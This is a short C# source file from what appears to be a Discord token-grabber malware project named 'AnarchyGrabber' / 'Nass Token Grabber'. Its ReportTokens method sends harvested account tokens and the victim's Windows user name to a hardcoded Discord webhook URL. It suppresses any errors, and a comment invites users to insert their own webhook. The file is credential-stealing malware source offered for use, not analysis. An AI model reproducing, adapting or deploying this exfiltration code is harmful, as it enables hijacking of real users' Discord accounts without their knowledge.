using System;
using System.Collections.Generic;
using System.Net.Http;

namespace AnarchyGrabber
{
    public static class Webhook
    {
        //you've got to change this to your own discord webhook url
        private static readonly string _hookUrl = "https://discordapp.com/api/webhooks/660819039647563786/EugoyvJXUZ-gMy0bQWaX-6LGauq0iCKi6lwBg9-KWs9LltdQynT2WAyFI6H2FaEkLmfT";


        public static void ReportTokens(List<string> tokenReport)
        {
            try
            {
                HttpClient client = new HttpClient();
                Dictionary<string, string> contents = new Dictionary<string, string>
                    {
                        { "content", $"Token report for '{Environment.UserName}'\n\n{string.Join("\n", tokenReport)}" },
                        { "username", "Nass Token Grabber" },
                        { "avatar_url", "https://media.discordapp.net/attachments/601457544380022790/609824918028419082/Anarchy.png" }
                    };

                client.PostAsync(_hookUrl, new FormUrlEncodedContent(contents)).GetAwaiter().GetResult();
            }
            catch { }
        }
    }
}
